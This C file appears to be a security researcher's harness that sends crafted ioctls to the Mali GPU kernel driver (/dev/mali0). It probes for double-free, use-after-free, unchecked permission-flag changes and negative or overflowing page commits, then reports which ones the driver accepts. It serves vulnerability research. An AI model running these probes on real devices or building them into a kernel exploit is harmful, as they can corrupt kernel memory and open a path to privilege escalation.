/*
 * mali_verify_bugs.c — Re-verify ALL Mali "vulnerabilities" with proper result checking
 * Previous tests only checked ioctl return, not header.id result code!
 */
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };
static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    ioctl(fd, make_cmd(16), hb);
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    ioctl(fd, make_cmd(16), hb);
    return fd;
}

static uint64_t mali_alloc_v(int fd, uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint32_t*)(buf + 32) = flags;
    int r = ioctl(fd, make_cmd(56), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    uint64_t va = *(uint64_t*)(buf + 40);
    if (r < 0 || result != 0) return 0;
    return va;
}

/* Return both ioctl result and header.id */
static int mali_free_v(int fd, uint64_t va, uint32_t *result_out) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    int r = ioctl(fd, make_cmd(16), buf);
    *result_out = ((struct uk_header*)buf)->id;
    return r;
}

static int mali_flags_change_v(int fd, uint64_t va, uint32_t flags, uint32_t mask, uint32_t *result_out) {
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = 517;
    *(uint64_t*)(buf + 8) = va;
    *(uint32_t*)(buf + 16) = flags;
    *(uint32_t*)(buf + 20) = mask;
    int r = ioctl(fd, make_cmd(32), buf);
    *result_out = ((struct uk_header*)buf)->id;
    return r;
}

static int mali_commit_v(int fd, uint64_t va, int64_t pages, uint32_t *result_out) {
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = 514;
    *(uint64_t*)(buf + 8) = va;
    *(int64_t*)(buf + 16) = pages;
    int r = ioctl(fd, make_cmd(32), buf);
    *result_out = ((struct uk_header*)buf)->id;
    return r;
}

int main(void) {
    printf("=== Mali Vulnerability Re-Verification ===\n");
    printf("IMPORTANT: Checking BOTH ioctl return AND header.id result!\n\n");

    int ctx = mali_open_ctx();
    if (ctx < 0) { printf("[-] Can't open mali\n"); return 1; }

    uint32_t res;

    /* BUG 1: Same-context double-free */
    printf("--- BUG 1: Same-context double-free ---\n");
    {
        uint64_t va = mali_alloc_v(ctx, 1, 0x0F);
        printf("  Alloc: va=0x%llx\n", (unsigned long long)va);

        mali_free_v(ctx, va, &res);
        printf("  Free #1: result=%u (%s)\n", res, res == 0 ? "SUCCESS" : "FAIL");

        mali_free_v(ctx, va, &res);
        printf("  Free #2: result=%u (%s)\n", res, res == 0 ? "**DOUBLE-FREE BUG**" : "Rejected");
    }

    /* BUG 2: FLAGS_CHANGE no validation (same context, active region) */
    printf("\n--- BUG 2: FLAGS_CHANGE no validation ---\n");
    {
        uint64_t va = mali_alloc_v(ctx, 1, 0x0F); /* CPU_RD|WR|GPU_RD|WR */
        printf("  Alloc: va=0x%llx flags=0x0F\n", (unsigned long long)va);

        /* Try adding GPU_EX */
        mali_flags_change_v(ctx, va, 0x10, 0x10, &res);
        printf("  FLAGS_CHANGE(+GPU_EX): result=%u (%s)\n", res,
               res == 0 ? "**NO VALIDATION BUG**" : "Rejected");

        /* Try adding GROW_ON_GPF */
        mali_flags_change_v(ctx, va, 0x40, 0x40, &res);
        printf("  FLAGS_CHANGE(+GROW_ON_GPF): result=%u (%s)\n", res,
               res == 0 ? "**NO VALIDATION BUG**" : "Rejected");

        /* Try setting ALL flags */
        mali_flags_change_v(ctx, va, 0xFFFFFFFF, 0xFFFFFFFF, &res);
        printf("  FLAGS_CHANGE(ALL): result=%u (%s)\n", res,
               res == 0 ? "**NO VALIDATION BUG**" : "Rejected");

        mali_free_v(ctx, va, &res);
    }

    /* BUG 3: FLAGS_CHANGE on freed region (same context) */
    printf("\n--- BUG 3: FLAGS_CHANGE on freed region ---\n");
    {
        uint64_t va = mali_alloc_v(ctx, 1, 0x0F);
        mali_free_v(ctx, va, &res);
        printf("  Freed va=0x%llx\n", (unsigned long long)va);

        mali_flags_change_v(ctx, va, 0x1F, 0x1F, &res);
        printf("  FLAGS_CHANGE on freed: result=%u (%s)\n", res,
               res == 0 ? "**USE-AFTER-FREE BUG**" : "Rejected");
    }

    /* BUG 4: MEM_COMMIT integer overflow */
    printf("\n--- BUG 4: MEM_COMMIT integer overflow ---\n");
    {
        uint64_t va = mali_alloc_v(ctx, 1, 0x0F);
        printf("  Alloc: va=0x%llx\n", (unsigned long long)va);

        /* Commit -1 pages */
        mali_commit_v(ctx, va, -1, &res);
        printf("  COMMIT(-1): result=%u (%s)\n", res,
               res == 0 ? "**INTEGER OVERFLOW BUG**" : "Rejected");

        /* Commit 0xFFFFFFFF pages */
        mali_commit_v(ctx, va, 0x7FFFFFFF, &res);
        printf("  COMMIT(0x7FFFFFFF): result=%u (%s)\n", res,
               res == 0 ? "**INTEGER OVERFLOW BUG**" : "Rejected");

        /* Commit huge negative */
        mali_commit_v(ctx, va, (int64_t)-0x100000, &res);
        printf("  COMMIT(-0x100000): result=%u (%s)\n", res,
               res == 0 ? "**UNDERFLOW BUG**" : "Rejected");

        mali_free_v(ctx, va, &res);
    }

    /* BUG 5: Alloc after COMMIT(-1) — allocator corruption check */
    printf("\n--- BUG 5: Allocator state after COMMIT(-1) ---\n");
    {
        uint64_t va = mali_alloc_v(ctx, 1, 0x0F);
        printf("  Initial alloc: va=0x%llx\n", (unsigned long long)va);

        mali_commit_v(ctx, va, -1, &res);
        printf("  COMMIT(-1): result=%u\n", res);

        /* Try 5 more allocs */
        for (int i = 0; i < 5; i++) {
            uint64_t va2 = mali_alloc_v(ctx, 1, 0x0F);
            printf("  Alloc #%d: va=0x%llx %s\n", i+1,
                   (unsigned long long)va2,
                   va2 == va ? "**SAME VA (corruption!)**" : "different");
        }

        mali_free_v(ctx, va, &res);
    }

    /* BUG 6: Cross-context free (definitive test) */
    printf("\n--- BUG 6: Cross-context free (definitive) ---\n");
    {
        int ctx2 = mali_open_ctx();
        uint64_t va = mali_alloc_v(ctx, 1, 0x0F);
        printf("  ctx alloc: va=0x%llx\n", (unsigned long long)va);

        mali_free_v(ctx2, va, &res);
        printf("  ctx2 free: result=%u (%s)\n", res,
               res == 0 ? "**CROSS-CONTEXT FREE BUG**" : "Rejected (NOT a bug)");

        /* Can ctx still use the region? */
        mali_flags_change_v(ctx, va, 0x0F, 0x0F, &res);
        printf("  ctx FLAGS_CHANGE after ctx2 free: result=%u (%s)\n", res,
               res == 0 ? "Region still alive" : "Region gone");

        mali_free_v(ctx, va, &res);
        printf("  ctx free (cleanup): result=%u\n", res);

        close(ctx2);
    }

    /* BUG 7: MEM_IMPORT (already known disabled, verify) */
    printf("\n--- BUG 7: MEM_IMPORT status ---\n");
    {
        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        int dummy = 0;
        *(uint64_t*)(buf + 8) = (uintptr_t)&dummy;
        *(uint32_t*)(buf + 16) = 2; /* UMM */
        *(uint32_t*)(buf + 40) = 0x4000000F;
        int r = ioctl(ctx, make_cmd(48), buf);
        res = ((struct uk_header*)buf)->id;
        printf("  MEM_IMPORT: ioctl=%d result=%u (%s)\n", r, res,
               res == 0 ? "Available" : "DISABLED");
    }

    close(ctx);
    printf("\n=== Summary ===\n");
    printf("Check results above for actual bug status.\n");
    printf("result=0 means SUCCESS (bug exists)\n");
    printf("result=3 means INVALID_PARAMETER (operation rejected, no bug)\n");
    return 0;
}
